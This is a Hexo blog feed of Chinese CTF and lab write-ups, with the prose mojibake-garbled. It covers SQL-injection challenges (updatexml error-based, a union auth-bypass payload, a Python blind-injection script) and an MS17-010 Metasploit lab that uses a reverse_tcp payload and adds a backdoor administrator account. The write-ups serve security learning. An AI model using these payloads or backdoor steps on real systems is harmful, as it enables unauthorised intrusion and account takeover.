byåé¢çš„å­—æ®µçš„å€¼åœ¨è™šæ‹Ÿè¡¨ä¸­ä¸å­˜åœ¨ï¼Œé‚£å°±éœ€è¦æŠŠå®ƒæ’å…¥åˆ°è™šæ‹Ÿè¡¨ä¸­ï¼Œè¿™é‡Œåœ¨æ’å…¥æ—¶ä¼šè¿›è¡Œç¬¬äºŒæ¬¡è¿ç®—ï¼Œç”±äºrandå‡½æ•°å­˜åœ¨ä¸€å®šçš„éšæœºæ€§ï¼Œæ‰€ä»¥ç¬¬äºŒæ¬¡è¿ç®—çš„ç»“æœå¯èƒ½ä¸ç¬¬ä¸€æ¬¡è¿ç®—çš„ç»“æœä¸ä¸€è‡´ï¼Œä½†æ˜¯è¿™ä¸ªè¿ç®—çš„ç»“æœå¯èƒ½åœ¨è™šæ‹Ÿè¡¨ä¸­å·²ç»å­˜åœ¨äº†ï¼Œé‚£ä¹ˆè¿™æ—¶çš„æ’å…¥å¿…ç„¶å¯¼è‡´ä¸»é”®çš„é‡å¤ï¼Œè¿›è€Œå¼•å‘é”™è¯¯ã€‚</p></blockquote><p>ç›¸å…³é“¾æ¥</p><p><a href="https://www.cnblogs.com/richardlee97/p/10617115.html">https://www.cnblogs.com/richardlee97/p/10617115.html</a></p><p><a href="https://www.jianshu.com/p/d8ae3e8dabdc">https://www.jianshu.com/p/d8ae3e8dabdc</a></p><p><a href="https://blog.csdn.net/qq_37873738/article/details/88042610">https://blog.csdn.net/qq_37873738/article/details/88042610</a></p><blockquote><p>UPDATEXML (XML_document, XPath_string, new_value);<br>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_documentæ˜¯Stringæ ¼å¼ï¼Œä¸ºXMLæ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸ºDoc<br>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpathæ ¼å¼çš„å­—ç¬¦ä¸²) ã€‚<br>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒStringæ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ® </p></blockquote><p>æŸ¥è¯¢è¯­å¥å¦‚ä¸‹</p><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">table_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">tables</span>)<span class="hljs-keyword">where</span>(table_schema)<span class="hljs-keyword">like</span>(<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(group_concat(<span class="hljs-built_in">column_name</span>))<span class="hljs-keyword">from</span>(information_schema.<span class="hljs-keyword">columns</span>)<span class="hljs-keyword">where</span>(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">like</span>(<span class="hljs-string">&#x27;H4rDsq1&#x27;</span>)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span>?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(<span class="hljs-keyword">password</span>)<span class="hljs-keyword">from</span>(H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre><p>è¿™é‡Œä¼šå‘ç°flagæ˜¾ç¤ºä¸å…¨ï¼Œå¯èƒ½æ˜¯æŠ¥é”™ç°å®çš„å­—æ•°é™åˆ¶ï¼Œåˆ©ç”¨right/leftå‡½æ•°ï¼Œæ˜¾ç¤ºéƒ¨åˆ†çš„flagï¼Œä¹‹åæ‹¼æ¥èµ·æ¥</p><p>æ˜¾ç¤ºåé¢çš„flag</p><pre><code class="hljs pgsql">?username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=dad%<span class="hljs-number">27</span><span class="hljs-keyword">or</span>(updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span>(right(<span class="hljs-keyword">password</span>,<span class="hljs-number">30</span>))<span class="hljs-keyword">from</span>(geek.H4rDsq1)),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>))%<span class="hljs-number">23</span></code></pre><h2 id="ç½‘é¼æ¯-2018-Fakebook"><a href="#ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="[ç½‘é¼æ¯ 2018]Fakebook"></a>[ç½‘é¼æ¯ 2018]Fakebook</h2><p>sqlæ³¨å…¥+ååºåˆ—åŒ–+ä»£ç å®¡è®¡</p><h2 id="GXYCTF2019-BabySQli"><a href="#GXYCTF2019-BabySQli" class="headerlink" title="[GXYCTF2019]BabySQli"></a>[GXYCTF2019]BabySQli</h2><p>ä¸‹è½½çš„æºç ï¼Œæœ‰åŠ©äºåé¢åšé¢˜</p><pre><code class="hljs php">mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&#x27;SET NAMES UTF8&#x27;</span>);<span class="hljs-variable">$name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pw&#x27;</span>];<span class="hljs-variable">$t_pw</span> = md5(<span class="hljs-variable">$password</span>);     <span class="hljs-comment">//å¯¹ä¼ å…¥çš„passwordå‚æ•°è¿›è¡Œäº†md5åŠ å¯†</span><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from user where username = &#x27;&quot;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&quot;&#x27;&quot;</span>;<span class="hljs-comment">// echo $sql;</span><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$con</span>, <span class="hljs-variable">$sql</span>);<span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&quot;/\(|\)|\=|or/&quot;</span>, <span class="hljs-variable">$name</span>))&#123;  <span class="hljs-comment">//  è¿‡æ»¤äº†() | = or </span><span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;do not hack me!&quot;</span>);&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">if</span> (!<span class="hljs-variable">$result</span>) &#123;printf(<span class="hljs-string">&quot;Error: %s\n&quot;</span>, mysqli_error(<span class="hljs-variable">$con</span>));<span class="hljs-keyword">exit</span>();&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-comment">// echo &#x27;&lt;pre&gt;&#x27;;</span><span class="hljs-variable">$arr</span> = mysqli_fetch_row(<span class="hljs-variable">$result</span>);<span class="hljs-comment">// print_r($arr);</span><span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;admin&quot;</span>)&#123;<span class="hljs-keyword">if</span>(md5(<span class="hljs-variable">$password</span>) == <span class="hljs-variable">$arr</span>[<span class="hljs-number">2</span>])&#123;    <span class="hljs-comment">//</span><span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong pass!&quot;</span>);&#125;&#125;<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;wrong user!&quot;</span>);&#125;&#125;&#125;</code></pre><p>éšä¾¿è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ï¼ŒæŸ¥çœ‹æºç ï¼Œå‡ºç°æç¤º</p><p><img src="https://i.loli.net/2020/11/30/yMceIJS4DYLHsh6.png" alt></p><p>è¯•äº†è¯•åº”è¯¥æ˜¯base32ï¼Œè§£ç åæ˜¯base64</p><pre><code class="hljs gcode">c<span class="hljs-number">2</span><span class="hljs-attr">VsZWN0</span>ICogZ<span class="hljs-symbol">nJvbSB1</span>c<span class="hljs-number">2</span>VyIHdoZXJlIHVzZXJuYW<span class="hljs-number">1</span>lID<span class="hljs-number">0</span>gJyRuYW<span class="hljs-number">1</span>lJw==</code></pre><p>ç»§ç»­è§£ç </p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">where</span> username = <span class="hljs-string">&#x27;$name&#x27;</span></code></pre><p>æ³¨å…¥ç‚¹æ˜¯nameå‚æ•°è¿™é‡Œï¼Œä¸ä¸Šé¢æºç ä¸­çš„æŸ¥è¯¢è¯­å¥ä¸€æ ·ã€‚</p><p>ç»è¿‡æµ‹è¯•å‘ç°æœ‰ä¸‰åˆ—ï¼Œ<code>name=admin&#39; union select 1,2,3 #&amp;pw=as#</code>æ˜¾ç¤ºæ­£å¸¸ï¼Œ<code>name=admn&#39; union select 1,2,3,4#&amp;pw=as</code>æŠ¥é”™</p><p>ä½†æ˜¯é¡µé¢æ²¡æœ‰æ•°å­—å›æ˜¾ï¼Œæ‰€ä»¥å¸¸è§„çš„æ³¨å…¥åº”è¯¥æ˜¯ä¸è¡Œçš„ã€‚</p><p>å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œè¿™é¢˜å¯ä»¥çŸ¥é“usernameæ˜¯adminï¼Œ</p><p>è¾“å…¥username=admin&amp;password=11,æ—¶æç¤ºwrong pass!</p><p>è¾“å…¥username=admn&amp;password=11,æ—¶æç¤ºwrong user!ï¼Œæ‰€ä»¥å¯ä»¥åˆ¤æ–­ç”¨æˆ·åä¸ºadmin</p><p>æ¥ä¸‹æ¥ä»‹ç»ä¸€ç§æ–°çš„unionæ³¨å…¥</p><p>å…ˆå»ºç«‹ä¸€å¼ è¡¨</p><p><img src="https://i.loli.net/2020/11/30/9bS4DTXuCfmxykg.png" alt></p><pre><code class="hljs n1ql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> test <span class="hljs-keyword">where</span> id=<span class="hljs-number">0</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;2322&#x27;</span>;</code></pre><p>unionè¯­å¥åæŸ¥è¯¢çš„æ˜¯è¡¨ä¸­ä¸å­˜åœ¨çš„ä¸€ä¸ªæ•°æ®ï¼ŒæŸ¥è¯¢ç»“æœå¦‚ä¸‹</p><p><img src="https://i.loli.net/2020/11/30/n6EeYVXdCxH72oO.png" alt></p><p><strong>è¿™ä¸ªç»“æœè¯´æ˜ï¼ŒunionæŸ¥è¯¢ä¸€ä¸ªä¸å­˜åœ¨çš„æ•°æ®æ—¶ï¼Œä¼šå»ºç«‹ä¸€ä¸ªè™šæ‹Ÿè¡¨</strong>ï¼Œå…¶ä¸­æ”¾ç€æ‰€æŸ¥è¯¢åˆ°çš„æ•°æ®å’ŒunionååŒ…å«çš„æ•°æ®</p><p>è¿™é‡Œå°±æ˜¯ id=1,username=admin,password=2322</p><p>è¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ”¹å˜æ•°æ®åº“ä¸­ç”¨æˆ·çš„å¯†ç ï¼Œç„¶åç”¨è‡ªå·±è®¾ç½®çš„å¯†ç ç™»å½•</p><p>æ¥ä¸‹æ¥ï¼Œåˆ©ç”¨è¿™ç‚¹åšè¿™ä¸ªé¢˜ç›®ï¼Œé¦–å…ˆçŸ¥é“ä¸€å…±ä¸‰åˆ—ï¼Œç¬¬ä¸€åˆ—åº”è¯¥æ˜¯idï¼ŒçŸ¥é“ä¹‹åä¸¤åˆ—çš„å†…å®¹å°±å¯ä»¥äº†</p><p><code>name=adm&#39; union select 1,&#39;a&#39;,&#39;s&#39; #&amp;pw=11</code>æç¤ºçš„wrong user!</p><p><code>name=adm&#39; union select 1,&#39;admin&#39;,&#39;s&#39; #&amp;pw=11</code>æç¤ºçš„wrong pass!</p><p>ç¬¬äºŒåˆ—çš„å­—æ®µååº”è¯¥å°±æ˜¯usernameï¼Œç¬¬ä¸‰åˆ—è‡ªç„¶å°±æ˜¯passwordï¼Œä½†æ˜¯è¿™é¢˜çš„passwordå­—æ®µå­˜æ”¾çš„æ—¶md5åŠ å¯†åçš„å†…å®¹<strong>ï¼ˆçœ‹åˆ°å¸ˆå‚…ä»¬çš„wpæ‰çŸ¥é“çš„ï¼Œçœ‹åˆ°æºç ä¹Ÿç¡®å®è¿™æ ·ï¼Œä½†æ˜¯åœ¨æ¯”èµ›çš„æ—¶å€™è¿™ä¹ˆå‘ç°ä¸å¾—è€ŒçŸ¥ï¼‰</strong></p><p>payload:</p><pre><code class="hljs apache"><span class="hljs-attribute">name</span>=<span class="hljs-number">000</span>&#x27;union select <span class="hljs-number">1</span>,&#x27;admin&#x27;,&#x27;b<span class="hljs-number">59</span>c<span class="hljs-number">67</span>bf<span class="hljs-number">196</span>a<span class="hljs-number">4758191</span>e<span class="hljs-number">42</span>f<span class="hljs-number">76670</span>ceba&#x27;#&amp;pw=<span class="hljs-number">1111</span></code></pre><p><code>b59c67bf196a4758191e42f76670ceba</code>æ˜¯1111çš„md5å€¼ï¼Œpwçš„å€¼ä¸º1111</p><p><img src="https://i.loli.net/2020/11/30/Xhp1PgH7QlejDYn.png" alt></p><h2 id="æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL"><a href="#æå®¢å¤§æŒ‘æˆ˜-2019-FinalSQL" class="headerlink" title="[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL"></a>[æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL</h2><p>ä¸hard sqlæ˜¯ä¸€ä¸ªç³»åˆ—çš„ï¼Œä½†æ˜¯è¿™ä¸ªåº”è¯¥æ˜¯ç›²æ³¨</p><p>åœ¨search.phpä¸­æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•å¯ä»¥å‘ç°æ˜¯æ•°å­—å‹æ³¨å…¥</p><p> fuzzä¹‹åå¯ä»¥å‘ç°å¯¹äºä¸åŒçš„å­—ç¬¦ï¼Œå›æ˜¾ä¸åŒï¼Œå¹¶ä¸”è¿‡æ»¤äº†ç©ºæ ¼ï¼Œä½†æ˜¯<code>^</code>æ²¡æœ‰è¢«è¿‡æ»¤ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨è¿™ä¸ªç¬¦å·</p><p>å¯ä»¥çœ‹åˆ°å½“id = 1 æ—¶ï¼Œé¡µé¢å›æ˜¾ä¸ºï¼Œå¯ä»¥å°†è¿™ä¸ªä¸ºåˆ¤æ–­çš„æ ‡å¿—</p><p><img src="https://i.loli.net/2020/12/23/DO6SQjuJLqm9ycM.png" alt="image-20201223090038080"></p><pre><code class="hljs apache"><span class="hljs-attribute">1</span>^<span class="hljs-number">1</span>^<span class="hljs-number">1</span> = <span class="hljs-number">1</span><span class="hljs-attribute">1</span>^<span class="hljs-number">0</span>^<span class="hljs-number">1</span> = <span class="hljs-number">0</span></code></pre><p>æ‰€ä»¥å¯ä»¥å°†æ³¨å…¥çš„payloadåŠ åˆ°ä¸­é—´ï¼Œä¾‹å¦‚</p><pre><code class="hljs perl"><span class="hljs-number">1</span>^(<span class="hljs-keyword">ord</span>(<span class="hljs-keyword">substr</span>((<span class="hljs-keyword">select</span>(group_concat(schema_name))from(information_schema.schemata)),%d,<span class="hljs-number">1</span>))=%d)^<span class="hljs-number">1</span><span class="hljs-string">&quot;%(i,ord(j))</span></code></pre><p>æ³¨å…¥è„šæœ¬å¦‚ä¸‹ï¼Œä½¿ç”¨çš„æ˜¯äºŒåˆ†æ³•</p><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> timeurl = <span class="hljs-string">&quot;http://6b5514f4-7df0-47b1-bca4-d13013ffd5d9.node3.buuoj.cn/search.php&quot;</span>flag = <span class="hljs-string">&#x27;&#x27;</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">payload</span>(<span class="hljs-params">i, j</span>):</span>    time.sleep(<span class="hljs-number">1</span>)    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot;%(i,j)                                #æ•°æ®åº“åå­—          </span>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;geek&#x27;),%d,1))&gt;%d)^1&quot;%(i,j)           #è¡¨å</span>    <span class="hljs-comment"># sql = &quot;1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F1naI1y&#x27;)),%d,1))&gt;%d)^1&quot;%(i,j)        #åˆ—å</span>    sql = <span class="hljs-string">&quot;1^(ord(substr((select(group_concat(password))from(F1naI1y)),%d,1))&gt;%d)^1&quot;</span> % (i, j)    data = &#123;<span class="hljs-string">&quot;id&quot;</span>: sql&#125;    r = requests.get(url, params=data)    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Click&quot;</span> <span class="hljs-keyword">in</span> r.text:        res = <span class="hljs-number">1</span>    <span class="hljs-keyword">else</span>:        res = <span class="hljs-number">0</span>    <span class="hljs-keyword">return</span> res<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">exp</span>():</span>    <span class="hljs-keyword">global</span> flag    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>):        print(i, <span class="hljs-string">&#x27;:&#x27;</span>)        low = <span class="hljs-number">31</span>        high = <span class="hljs-number">127</span>        <span class="hljs-keyword">while</span> low &lt;= high:            mid = (low + high) // <span class="hljs-number">2</span>            res = payload(i, mid)            <span class="hljs-keyword">if</span> res:                low = mid + <span class="hljs-number">1</span>            <span class="hljs-keyword">else</span>:                high = mid - <span class="hljs-number">1</span>        f = <span class="hljs-built_in">int</span>((low + high + <span class="hljs-number">1</span>)) // <span class="hljs-number">2</span>        <span class="hljs-keyword">if</span> (f == <span class="hljs-number">127</span> <span class="hljs-keyword">or</span> f == <span class="hljs-number">31</span>):            <span class="hljs-keyword">break</span>        <span class="hljs-comment"># print (f)</span>        flag += <span class="hljs-built_in">chr</span>(f)        print(flag)exp()print(<span class="hljs-string">&#x27;flag=&#x27;</span>, flag)</code></pre><p>åˆå­¦åˆ°äº†æ–°çš„æ³¨å…¥å§¿åŠ¿ï¼ŒçœŸä¸é”™</p><p>å‚è€ƒï¼š<a href="https://www.cnblogs.com/wangtanzhi/p/12305052.html">https://www.cnblogs.com/wangtanzhi/p/12305052.html</a></p>]]></content>
    
    
    <categories>
      
      <category>buuoj</category>
      
    </categories>
    
    
    <tags>
      
      <tag>äºŒåˆ†æ³¨å…¥</tag>
      
      <tag>æŠ¥é”™æ³¨å…¥</tag>
      
      <tag>unionæ–°å§¿åŠ¿</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ç½‘å®‰ä½œä¸š1</title>
    <link href="/2020/09/27/homework/"/>
    <url>/2020/09/27/homework/</url>
    
    <content type="html"><![CDATA[<h1 id="MS17-010"><a href="#MS17-010" class="headerlink" title="MS17-010"></a>MS17-010</h1><span id="more"></span><h2 id="1-å‡†å¤‡å·¥ä½œ"><a href="#1-å‡†å¤‡å·¥ä½œ" class="headerlink" title="1.å‡†å¤‡å·¥ä½œ"></a>1.å‡†å¤‡å·¥ä½œ</h2><p>å¼€å¯ä¸¤å°è™šæ‹Ÿæœºï¼Œä¸€å°kaliä½œä¸ºæ”»å‡»æ–¹ï¼Œä¸€å°win7ä½œä¸ºè¢«æ”»å‡»æ–¹</p><p>å°†ä¸¤å°è™šæ‹Ÿæœºæ¡¥æ¥åˆ°åŒä¸€ç½‘å¡ï¼Œå¹¶ä¿è¯èƒ½å¤Ÿé€šä¿¡</p><p>Kali IP 10.1.1.1  255.0.0.0  win7 IPã€€10.1.1.2  255.0.0.0</p><p>æµ‹è¯•ä¸¤å°ä¸»æœºä¹‹é—´çš„é€šä¿¡æƒ…å†µ</p><p><img src="https://i.loli.net/2020/11/30/BAUIrJYP4ahwb3Z.png" alt="1.png"></p><p><img src="https://i.loli.net/2020/11/30/skpyjBZi8T94hbO.png" alt="2.png"> </p><p>ä½¿ç”¨msfå‰éœ€è¦å¼€å¯postgresqlæœåŠ¡ </p><p>å¼€å¯æœåŠ¡ï¼šservice postgresql start </p><p>æŸ¥çœ‹æœåŠ¡çŠ¶æ€ï¼šservice postgresql status</p><p>å¼€åˆ°ç»¿è‰²å­—ä½“çš„activeå³ä¸ºå¼€å¯äº†</p><p>åˆå§‹åŒ–æ•°æ®åº“ï¼šmsfdb init </p><p><img src="https://i.loli.net/2020/11/30/g72amLUwHvp3jSe.png" alt="3.png"> </p><h2 id="2-æ”»å‡»è¿‡ç¨‹"><a href="#2-æ”»å‡»è¿‡ç¨‹" class="headerlink" title="2. æ”»å‡»è¿‡ç¨‹"></a>2. æ”»å‡»è¿‡ç¨‹</h2><h3 id="1-é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£"><a href="#1-é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£" class="headerlink" title="(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£"></a>(1).é¦–å…ˆåˆ¤æ–­ç›®æ ‡ä¸»æœºæ˜¯å¦æ‰“å¼€445ç«¯å£</h3><p>ä½¿ç”¨nmap+ip æ‰«æ</p><h3 id="2-ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»"><a href="#2-ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»" class="headerlink" title="(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»"></a>(2) .ç¡®è®¤ç›®æ ‡ä¸»æœºæ‰“å¼€445ç«¯å£åç›´æ¥ä½¿ç”¨msfè¿›è¡Œæ”»å‡»</h3><p>è¾“å…¥msfconsoleã€€å¯åŠ¨msf</p><p>è¾“å…¥searchã€€MS17-010</p><p>æ‰¾åˆ°exploit windows/smb/ms17_010_eternalblue,</p><p>è¿è¡Œ</p><pre><code class="hljs apache"><span class="hljs-attribute">use</span> exploitwindows/smb/ms<span class="hljs-number">17</span>_<span class="hljs-number">010</span>_eternalblue</code></pre><p>è¾“å…¥ show options  æŸ¥çœ‹éœ€è¦é…ç½®å“ªäº›ä¿¡æ¯</p><p>RHOSTS ä¸ºç›®æ ‡ä¸»æœºIP(10.1.1.2)</p><p>RPORT ä¸ºç›®æ ‡ç«¯å£å·(445)</p><p>LHOST ä¸ºç›‘å¬ä¸»æœºIP(10.1.1.1)</p><p><img src="https://i.loli.net/2020/11/30/adxKYb5StmsJWF7.png" alt="5.png"> </p><p> <img src="https://i.loli.net/2020/11/30/bq6YZiehzAtxEcu.png" alt="6.png"></p><h3 id="3-é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥"><a href="#3-é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥" class="headerlink" title="(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥"></a>(3). é…ç½®æˆåŠŸåè®¾ç½®tcpè¿æ¥</h3><p>è¾“å…¥å‘½ä»¤</p><pre><code class="hljs awk">set payload windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp</code></pre><h3 id="4-å¼€å§‹è¿è¡Œ"><a href="#4-å¼€å§‹è¿è¡Œ" class="headerlink" title="(4).å¼€å§‹è¿è¡Œ"></a>(4).å¼€å§‹è¿è¡Œ</h3><p>è¾“å…¥ exploit/run </p><p>æˆåŠŸè·å–shell</p><p><img src="https://i.loli.net/2020/11/30/Cyj8Kt6ldzMbGh9.png" alt="7.png"></p><p>æŸ¥çœ‹ipåœ°å€éªŒè¯æ˜¯å¦ä¸ºç›®æ ‡ä¸»æœºã€‚</p><p> <img src="https://i.loli.net/2020/11/30/OTBhu37xXEv2Pb8.png" alt="8.png"></p><h3 id="5-è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·"><a href="#5-è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·" class="headerlink" title="(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·"></a>(5)è®¾ç«‹åé—¨ï¼Œåœ¨ç›®æ ‡ä¸»æœºä¸­åˆ›å»ºä¸€ä¸ªç”¨æˆ·</h3><p>åˆ›å»ºä¸€ä¸ªç”¨æˆ·</p><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">test</span> abc123.com /add</code></pre><p>Username:test </p><p>password:abc123.com</p><p>å°†è¯¥ç”¨æˆ·åŠ å…¥ç®¡ç†å‘˜ç»„ï¼Œä½¿å…¶æ‹¥æœ‰ç®¡ç†å‘˜æƒé™</p><pre><code class="hljs stata"><span class="hljs-keyword">net</span> localgroup administrtors <span class="hljs-keyword">test</span> /add</code></pre><p><img src="https://i.loli.net/2020/11/30/LAqgMpZ9kUSd6ow.png" alt="10.png"></p><p>ç›®æ ‡ä¸»æœºä¸Šç”¨æˆ·åˆ›å»ºæˆåŠŸ</p><p><img src="https://i.loli.net/2020/11/30/LPm3HzVNfW5k947.png" alt="11.png"></p><p>  <strong>å®éªŒç»“æŸ</strong></p>]]></content>
    
    
    <categories>
      
      <category>ç½‘å®‰ä½œä¸š</category>
      
    </categories>
    
    
    <tags>
      
      <tag>msf</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>fakebook</title>
    <link href="/2020/09/27/fakebook/"/>
    <url>/2020/09/27/fakebook/</url>
    
    <content type="html"><![CDATA[<h1 id="æ”»é˜²ä¸–ç•Œ-fakebook"><a href="#æ”»é˜²ä¸–ç•Œ-fakebook" class="headerlink" title="æ”»é˜²ä¸–ç•Œ-fakebook"></a>æ”»é˜²ä¸–ç•Œ-fakebook</h1><p>æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹å§</p><span id="more"></span><h2 id="0x01å‘ç°æ³¨å…¥ç‚¹"><a href="#0x01å‘ç°æ³¨å…¥ç‚¹" class="headerlink" title="0x01å‘ç°æ³¨å…¥ç‚¹"></a>0x01å‘ç°æ³¨å…¥ç‚¹</h2><p>è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªåšå®¢é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ³¨å…¥çš„åœ°æ–¹</p><p><code>http://220.249.52.133:44224/view.php?no=1</code>å‚æ•°noè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—å‹çš„æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•ä¸€ä¸‹ã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯</p><p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>ç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šäº†å°±æ˜¯æ•°å­—å‹æ³¨å…¥</p><p>æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥çš„å¸¸è§„æ“ä½œã€‚</p><p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>æ—¶é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œå¹¶æç¤ºäº†ç½‘ç«™çš„æ ¹ç›®å½•</p><p><img src="https://i.loli.net/2020/11/30/oIDBgmVNszZ3raw.png" alt></p><p>ä½†æ˜¯å½“ order by 5 # æ—¶ï¼Œç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šæ˜¯å››åˆ—ã€‚</p><p><strong>çˆ†è¡¨å</strong></p><p>æœ¬ä»¥ä¸ºä¼šé¡ºåˆ©çš„çˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æç¤ºäº† hacker ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨é»‘åå•æ£€æµ‹</p><p>è¯•äº†è¯•åŒå†™ç»•è¿‡ï¼Œå‘ç°ç»§ç»­æç¤ºhackï¼Œå†è¯•è¯•ç”¨/**/æ›¿æ¢ç©ºæ ¼ï¼Œè¿™æ¬¡å±…ç„¶å¯ä»¥äº†ï¼Œæš‚ä¸”å½“å®ƒæ˜¯ç¦äº†ç©ºæ 